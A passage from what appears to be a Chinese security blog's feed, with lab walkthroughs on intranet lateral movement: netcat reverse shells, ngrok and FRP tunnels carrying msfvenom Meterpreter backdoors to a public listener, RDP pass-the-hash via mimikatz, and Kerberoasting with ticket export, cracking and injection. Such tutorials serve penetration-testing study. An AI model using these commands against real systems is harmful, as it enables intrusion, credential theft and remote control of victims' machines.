class="language-none">nc 192.168.x.x 3333 #连接外网的网卡ip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/07/18/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%85%AD%E3%80%91/image-20220718204826901.png" alt="image-20220718204826901"></p><h3 id="0x02-相关-netcat-主要功能"><a href="#0x02-相关-netcat-主要功能" class="headerlink" title="0x02 相关 netcat 主要功能"></a>0x02 相关 netcat 主要功能</h3><p>指纹服务：nc -nv 192.168.76.143<br>端口扫描：nc -v -z 192.168.76.143 1-100<br>端口监听：nc -lvp xxxx<br>文件传输：nc -lp 1111 &gt;1.txt|nc -vn xx.xx.x.x 1111 &lt;1.txt -q 1<br>反弹 Shell：见上</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网安全-域横向渗透【五】</title>
      <link href="/2022/07/15/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%94%E3%80%91/"/>
      <url>/2022/07/15/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%94%E3%80%91/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>脑图：<br><img src="/2022/07/15/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%94%E3%80%91/%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F-%E7%A9%BF%E9%80%8F.png" alt="横向渗透-穿透"></p><h2 id="0x01-知识点"><a href="#0x01-知识点" class="headerlink" title="0x01 知识点"></a>0x01 知识点</h2><h3 id="0x00-内外网判断"><a href="#0x00-内外网判断" class="headerlink" title="0x00 内外网判断"></a>0x00 内外网判断</h3><ul><li>内网ip地址是私有ip地址（10&#x2F;8, 172.16&#x2F;12 , 192.168&#x2F;16），除此之外就是外网ip。</li></ul><h3 id="0x01-内网1和内网2通信问题"><a href="#0x01-内网1和内网2通信问题" class="headerlink" title="0x01 内网1和内网2通信问题"></a>0x01 内网1和内网2通信问题</h3><ul><li>两个不同的内网的主机想要通过CS或者MSF等工具实现控制或者通讯是不可能的，必须要借助代理。（同一内网无法通过后门控制对应主机，只能通过代理）</li></ul><h3 id="0x02-正反向协议通信连接问题"><a href="#0x02-正反向协议通信连接问题" class="headerlink" title="0x02  正反向协议通信连接问题"></a>0x02  正反向协议通信连接问题</h3><ul><li>正向：控制端主动去连接被控端</li><li>反向：被控端主动去连接控制端</li><li>为什么要区分正向和反向？–因为如果控制端是外网主机，被控端是内网主机，就相当于控制端有一个唯一的IP地址（比如103.12.4.11），通过这个IP地址就可以找到控制端，而在内网的被控端（比如192.168.23.36），你通过控制端主动去找是找不到的，因为这个内网IP地址并不是唯一的，可能很多内网都用了这个IP地址，你根本没法找。此时就需要反向连接了，让内网的被控端主动去找外网的控制端。</li></ul><h3 id="0x03-内网穿透代理隧道技术说明"><a href="#0x03-内网穿透代理隧道技术说明" class="headerlink" title="0x03 内网穿透代理隧道技术说明"></a>0x03 内网穿透代理隧道技术说明</h3><ul><li>隧道主要解决流量分析工具、流量监控工具、防火墙等相关工具的过滤问题</li><li>代理主要解决网络的连通性问题</li></ul><h2 id="0x02-内网穿透Ngrok测试演示-两个内网通讯上线"><a href="#0x02-内网穿透Ngrok测试演示-两个内网通讯上线" class="headerlink" title="0x02 内网穿透Ngrok测试演示-两个内网通讯上线"></a>0x02 内网穿透Ngrok测试演示-两个内网通讯上线</h2><h3 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h3><p>实验环境：两个不同的内网(有网络)实现穿透控制</p><p><img src="/2022/07/15/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%94%E3%80%91/image-20220715203229401.png" alt="image-20220715203229401"></p><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p><strong>ngrok下载：</strong></p><pre class="line-numbers language-none"><code class="language-none">国外地址：https:&#x2F;&#x2F;ngrok.com&#x2F;国内地址：https:&#x2F;&#x2F;www.ngrok.cc&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>开通隧道，配置隧道协议，选择什么协议，后续生成的木马就走什么协议：</p><p><img src="/2022/07/15/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%94%E3%80%91/image-20220716094606349.png" alt="image-20220716094606349"></p><p><img src="/2022/07/15/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%94%E3%80%91/image-20220716095359331.png" alt="image-20220716095359331"></p><h3 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h3><p>将下载好的linux客户端传入Kali主机：<br><img src="/2022/07/15/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%94%E3%80%91/image-20220716095507079.png" alt="image-20220716095507079"></p><p>其中有一个sunny文件：</p><p><img src="/2022/07/15/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%94%E3%80%91/image-20220716095517051.png" alt="image-20220716095517051"></p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><pre class="line-numbers language-none"><code class="language-none">执行以下命令启动文件：.&#x2F;sunny cilentid 094604366530    #094604366530是隧道id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2022/07/15/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%94%E3%80%91/image-20220716095652513.png" alt="image-20220716095652513"></p><p><img src="/2022/07/15/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%94%E3%80%91/image-20220716101502779.png" alt="image-20220716101502779"></p><p>出现online表示启动成功，若是其他需要更换隧道或者排查其他情况。</p><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>使用msf生成后门：</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_http lhost&#x3D;test00000.free.idcfengye.com lport&#x3D;80 -f exe -o test.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/07/15/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%94%E3%80%91/image-20220716102255527.png" alt="image-20220716102255527"></p><p><img src="/2022/07/15/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%94%E3%80%91/image-20220716102318480.png" alt="image-20220716102318480"></p><h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>将后门传入到win7目标机：</p><p><img src="/2022/07/15/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%94%E3%80%91/image-20220716102739369.png" alt="image-20220716102739369"></p><h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><p>监听后门：</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handlerset payload windows&#x2F;meterpreter&#x2F;reverse_httpset lhost 192.168.216.150set lport 4444exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/07/15/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%94%E3%80%91/image-20220716103118763.png" alt="image-20220716103118763"></p><h3 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h3><p>执行后门可以看到监听到会话：</p><p><img src="/2022/07/15/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%94%E3%80%91/image-20220716103658171.png" alt="image-20220716103658171"></p><p><img src="/2022/07/15/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%94%E3%80%91/image-20220716103510590.png" alt="image-20220716103510590"></p><p>##0x03 内网穿透Frp自建跳板测试</p><p>FRP说明文档：<a href="https://gofrp.org/docs/">https://gofrp.org/docs/</a></p><p>Frp工具：开源免费，自行搭建，方便修改，成本低，使用多样化，防止隐私泄露。而Ngrok工具使用的是别人的服务器，容易泄露隐私数据。</p><pre class="line-numbers language-none"><code class="language-none">1.服务端-下载-解压-修改-启动（阿里云主机记得修改安全组配置出入口）FRP下载地址：https:&#x2F;&#x2F;github.com&#x2F;fatedier&#x2F;frp&#x2F;releases服务器修改配置文件frps.ini：[common]bind_port &#x3D; 6677启动服务端：.&#x2F;frps -c .&#x2F;frps.ini2.控制端-下载-解压-修改-启动控制端修改配置文件frpc.ini：[common] server_addr &#x3D; 你的云主机ipserver_port &#x3D; 6677 #frpc工作端口，必须和上面frps保持一致[msf]type&#x3D; tcplocal_ip &#x3D; 127.0.0.1local_port &#x3D; 5555 #转发给本机的5555remote_port &#x3D; 6000 #服务端用6000端口转发给本机启动客户端(kali)：.&#x2F;frpc -c .&#x2F;frpc.ini生成后门：msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcplhost&#x3D;你的公网ip lport&#x3D;6000 -f exe -o frp.exe use exploit &#x2F;multi&#x2F;handler set payload windows &#x2F;meterpreter&#x2F;reverse_tcp set LHOST 127.0.0.1 set LPORT 5555 exploit3.靶机运行frp即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>案例演示</p><p>1.服务端-下载-解压-修改-启动（阿里云主机记得修改安全组配置出入口）</p><pre class="line-numbers language-none"><code class="language-none">服务器修改配置文件frps.ini：[common]bind_port &#x3D; 6677启动服务端：.&#x2F;frps -c .&#x2F;frps.ini<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2022/07/15/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%94%E3%80%91/1375459-20210928155812015-1406516529.png" alt="img"></p><p><img src="/2022/07/15/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%94%E3%80%91/1375459-20210928155823839-811696181.png" alt="img"></p><p>2.控制端-下载-解压-修改-启动</p><p>&lt;1&gt;控制端修改配置文件frpc.ini</p><pre class="line-numbers language-none"><code class="language-none">[common]server_addr &#x3D; 你的云主机ipserver_port &#x3D; 6677#frpc工作端口，必须和上面frps保持一致[msf]type&#x3D; tcplocal_ip &#x3D; 127.0.0.1local_port &#x3D; 5555 #转发给本机的5555remote_port &#x3D; 6000 #服务端用6000端口转发给本机<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/07/15/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%94%E3%80%91/1375459-20210928155837778-513331035.png" alt="img"></p><p>&lt;2&gt;启动客户端(kali)</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;frpc -c .&#x2F;frpc.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/07/15/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%94%E3%80%91/1375459-20210928160008699-436444639.png" alt="img"></p><p>此时服务端收到端口连接</p><p><img src="/2022/07/15/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%94%E3%80%91/1375459-20210928160142044-21242600.png" alt="img"></p><p>&lt;3&gt;生成后门</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;你的公网ip lport&#x3D;6000 -f exe -o frp.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/07/15/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%94%E3%80%91/1375459-20210928160206101-1430755926.png" alt="img"></p><p>&lt;4&gt;配置监听</p><pre class="line-numbers language-none"><code class="language-none">use exploit &#x2F;multi&#x2F;handler set payload windows &#x2F;meterpreter&#x2F;reverse_tcp set LHOST 127.0.0.1 set LPORT 5555 exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/07/15/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%94%E3%80%91/1375459-20210928160217474-1157825274.png" alt="img"></p><p>3.将后门文件拷贝到靶机，运行。如上图所示，监听到会话。</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网安全-域横向渗透【四】</title>
      <link href="/2022/06/30/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%9B%9B%E3%80%91/"/>
      <url>/2022/06/30/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%9B%9B%E3%80%91/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>脑图：<br><img src="/2022/06/30/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%9B%9B%E3%80%91/%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F-%E5%9F%9F%E7%8E%AF%E5%A2%83.png" alt="横向渗透-域环境"></p><h2 id="0x01-RDP传递-Mimikatz"><a href="#0x01-RDP传递-Mimikatz" class="headerlink" title="0x01 RDP传递-Mimikatz"></a>0x01 RDP传递-Mimikatz</h2><h3 id="0x00-RDP介绍"><a href="#0x00-RDP介绍" class="headerlink" title="0x00 RDP介绍"></a>0x00 RDP介绍</h3><p>远程桌面协议(RDP)是一个多通道的协议，让使用者(所在计算机称为用户端或’本地计算机’)连上提供微软终端机服务的计算机(称为服务端或’远程计算机’)。</p><p>大部分的Windows版本都有用户端所需软件，有些其他操作系统也有这些用户端软件，例如Linux,FreeBSD，MacOSX，服务端计算机方面，使用TCP3389端口。</p><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><ul><li><p>RDP协议也可以传输明文密码或HASH密文进行连接操作；</p></li><li><p>RDP协议连接：端口扫描判断对方远程桌面是否开启（3389）；</p></li><li><p>对方主机必须打开允许远程桌面连接：<br><img src="/2022/06/30/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%9B%9B%E3%80%91/image-20220630104101201.png" alt="image-20220630104101201"></p></li><li><p>RDP明文密码连接：</p><pre class="line-numbers language-none"><code class="language-none">Windows: mstscmstsc.exe &#x2F;console &#x2F;v192.168.3.21 &#x2F;adminlinux: rdesktop 192.168.3.21:3389<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>RDPHash密文连接：</p></li></ul><blockquote><p>注意：windows Server需要开启 Restricted Admin mode，在Windows 8.1和Windows Server 2012 R2中默认开启，同时如果Win 7 和Windows Server 2008 R2安装了2871997、2973351补丁也支持；</p></blockquote><p>开启命令：</p><pre class="line-numbers language-none"><code class="language-none">REG ADD “HKLM\System\CurrentControlSet\Control\Lsa” &#x2F;v DisableRestrictedAdmin &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>开启后运行：</p><pre class="line-numbers language-none"><code class="language-none">mstsc.exe &#x2F;restrictedadminmimikatz.exeprivilege::debugsekurlsa::pth &#x2F;user:administrator &#x2F;domain:god &#x2F;ntlm:ccef208c6485269c20db2cad21734fe7 “&#x2F;run:mstsc.exe &#x2F;restrictedadmin”<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x02-SPN服务-探针-请求-破解-重写"><a href="#0x02-SPN服务-探针-请求-破解-重写" class="headerlink" title="0x02 SPN服务-探针,请求,破解,重写"></a>0x02 SPN服务-探针,请求,破解,重写</h2><h3 id="0x00-SPN介绍"><a href="#0x00-SPN介绍" class="headerlink" title="0x00 SPN介绍"></a>0x00 SPN介绍</h3><p>服务主体名称（SPN）是Kerberos客户端用于唯一标识给特定Kerberos目标计算机的服务实例名称。Kerberos身份验证使用SPN将服务实例与服务登录帐户相关联。如果在整个林中的计算机上安装多个服务实例，则每个实例都必须具有自己的SPN。如果客户端可能使用多个名称进行身份验证，则给定的服务实例可以具有多个SPN。例如，SPN总是包含运行服务实例的主机名称，所以服务实例可以为其主机的每个名称或别名注册一个SPN。</p><h3 id="0x01-SPN扫描"><a href="#0x01-SPN扫描" class="headerlink" title="0x01 SPN扫描"></a>0x01 SPN扫描</h3><p>1、当计算机加入域时，主SPN会自动添加到域的计算机账号的ServicePrincipalName属性中；在安装新的服务后，SPN也会被记录在计算机账号的相应属性中。</p><p>2、SPN扫描也可以叫扫描Kerberos服务实例名称，在Active Directory环境中发现服务的最佳方法是通过“SPN扫描”。通过请求特定SPN类型的服务主体名称来查找服务，SPN扫描攻击者通过网络端口扫描的主要好处是SPN扫描不需要连接到网络上的每个IP来检查服务端口。SPN扫描通过LDAP查询向域控制器执行服务发现。由于SPN查询是普通Kerberos票据的一部分，因此如果不能被查询，但可以用网络端口扫描来确认。</p><p>3、由于SPN扫描是基于LDAP协议向域控制器进行查询的，所以，攻击者只需要获得一个普通的域用户权限，就可以进行SPN扫描。</p><p>4、<strong>攻击过程：</strong>黑客可以使用有效的域用户的身份验证票证（TGT）去请求运行在服务器上的一个或多个目标服务的服务票证。DC在活动目录中查找SPN，并使用与SPN关联的服务帐户加密票证，以便服务能够验证用户是否可以访问。请求的Kerberos服务票证的加密类型是RC4_HMAC_MD5，这意味着服务帐户的NTLM密码哈希用于加密服务票证。黑客将收到的TGS票据离线进行破解，即可得到目标服务帐号的HASH，这个称之为Kerberoast攻击。如果我们有一个为域用户帐户注册的任意SPN，那么该用户帐户的明文密码的NTLM哈希值就将用于创建服务票证。这就是Kerberoasting攻击的关键。</p><blockquote><p>SPN扫描流程：</p><p>探针-请求-破解-重写</p><p>优点：优于工具的端口扫描，不容易被防火墙等防护软件所触发，同时也可以探针服务，速度很快。</p></blockquote><h3 id="0x02-探针"><a href="#0x02-探针" class="headerlink" title="0x02 探针"></a>0x02 探针</h3><p>1、查看是否在域内：<br><img src="/2022/06/30/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%9B%9B%E3%80%91/image-20220630111616065.png" alt="image-20220630111616065"></p><p>2、调用spn扫描（自带的）：</p><pre class="line-numbers language-none"><code class="language-none">setspn -q *&#x2F;* #扫描全部<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/30/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%9B%9B%E3%80%91/image-20220630111754727.png" alt="image-20220630111754727"></p><p><img src="/2022/06/30/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%9B%9B%E3%80%91/image-20220630111954277.png" alt="image-20220630111954277"></p><p><img src="/2022/06/30/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%9B%9B%E3%80%91/image-20220630111902984.png" alt="image-20220630111902984"></p><p>探针到相应的服务：WEBSERVER，FILESERVER，SQLSERVER等。</p><p>3、筛选指定服务：</p><pre class="line-numbers language-none"><code class="language-none">setspn -q *&#x2F;* | findstr &quot;MSSQL&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/30/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%9B%9B%E3%80%91/image-20220630112625948.png" alt="image-20220630112625948"></p><p>4、删除缓存票据：（防止干扰）</p><pre class="line-numbers language-none"><code class="language-none">klist purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/30/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%9B%9B%E3%80%91/image-20220630112843702.png" alt="image-20220630112843702"></p><h3 id="0x03-请求"><a href="#0x03-请求" class="headerlink" title="0x03 请求"></a>0x03 请求</h3><p>1、使用powershell请求：（cmd命令行不能请求）</p><pre class="line-numbers language-none"><code class="language-none">Add-Type -AssemblyName System.IdentityModel<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/30/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%9B%9B%E3%80%91/image-20220630113308532.png" alt="image-20220630113308532"></p><blockquote><p>mimikatz请求 mimikatz.exe “kerberos::ask &#x2F;target:xxxx”</p></blockquote><p>2、请求服务：（引号中填写探针到的服务名）</p><pre class="line-numbers language-none"><code class="language-none">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc&#x2F;sqlserver.test.com:1433&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/30/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%9B%9B%E3%80%91/image-20220630113648481.png" alt="image-20220630113648481"></p><p>3、klist查看，多了一条MSSQL的请求：<br><img src="/2022/06/30/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%9B%9B%E3%80%91/image-20220630113720328.png" alt="image-20220630113720328"></p><p>4、使用mimikatz导出票据：</p><pre class="line-numbers language-none"><code class="language-none">mimikatz # kerberos::list &#x2F;export<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/30/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%9B%9B%E3%80%91/image-20220630114128816.png" alt="image-20220630114128816"></p><p><img src="/2022/06/30/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%9B%9B%E3%80%91/image-20220630114144655.png" alt="image-20220630114144655"></p><h3 id="0x04-破解"><a href="#0x04-破解" class="headerlink" title="0x04 破解"></a>0x04 破解</h3><p>使用kerberoast爆破票据；</p><p>（将爆破的票据放在kerberoast文件夹下）</p><pre class="line-numbers language-none"><code class="language-none">python3 tgsrepcrack.py passwd.txt 1-40a00000-webadmin@MSSQLSvc~sqlserver.test.com~1433-TEST.COM.kirbi#使用pytho3执行tgsrepcrack.py爆破脚本，密码字典为passwd&#x2F;txt，加上需要破解的票据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2022/06/30/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%9B%9B%E3%80%91/image-20220630121822231.png" alt="image-20220630121822231"></p><p>这里没有设置sqlserver的密码，导致没有爆破成功。</p><h3 id="0x05-重写"><a href="#0x05-重写" class="headerlink" title="0x05 重写"></a>0x05 重写</h3><blockquote><p>-p 是得到的密码，-r 票据文件，-w 将票据文件重写为PENTESTLAB.kirbi，-u 指向用户名的编号，500是admin用户的标识，-g 指向组，512对应管理员组</p></blockquote><pre class="line-numbers language-none"><code class="language-none">python kerberoast.py -p Password123 -r 1-40a00000-webadmin@MSSQLSvc~sqlserver.test.com~1433-TEST.COM.kirbi -w PENTESTLAB.kirbi -u 500<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -g 512<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/30/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%9B%9B%E3%80%91/image-20220630155037935.png" alt="image-20220630155037935"></p><p>这里报错了，但是可以看到生成了相应文件PENTESTLAB.kirbi</p><blockquote><p> 最后使用miikatz将生成的票据注入内存</p></blockquote><pre class="line-numbers language-none"><code class="language-none">mimikatz # kerberos::ptt xxxx.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h3><blockquote><p>SPN主要用于探针，获取密码等等，重写一般不成功，获取不到sa权限的密码，只能获取到普通权限的密码，重写比较鸡肋。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网安全-域横向渗透【三】</title>
      <link href="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91/"/>
      <url>/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91/</url>
      
